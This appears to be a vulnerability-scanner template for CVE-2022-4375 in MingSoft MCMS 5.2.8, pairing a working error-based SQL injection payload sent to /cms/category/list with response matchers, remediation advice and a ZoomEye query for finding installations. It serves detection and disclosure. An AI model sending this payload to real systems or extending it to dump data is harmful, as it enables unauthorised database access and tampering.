id: CVE-2022-4375

info:
  name: MingSoft MCMS 5.2.8 - SQL Injection
  author: HuTa0
  severity: critical
  description: |
    A SQL injection vulnerability exists in MingSoft MCMS version 5.2.8. Malicious attackers can exploit this vulnerability to execute malicious injection statements to obtain sensitive data or tamper with the database.
  remediation: |
    Timely update MingSoft MCMS to the latest version, use parameterized queries or precompiled statements and filter and validate inputs to prevent SQL injection attacks.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-4375
    - https://gitee.com/mingSoft/MCMS/issues/I61TG5
  metadata:
    zoomeye-query: app:"MingSoft MCMS"
  tags: cve,cve2022,mingsoft,sqli
variables:
  random_str: "{{rand_base(6)}}"
  match_str: "{{md5(random_str)}}"

http:
  - raw:
      - |
        POST /cms/category/list HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        sqlWhere=[{"action":"","field":"1 AND updatexml(1,concat(0x7e,md5({{random_str}})),1)","el":"eq","model":"contentTitle","name":"文章标题","type":"input","value":"a"}]

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "{{match_str}}"

      - type: status
        status:
          - 500
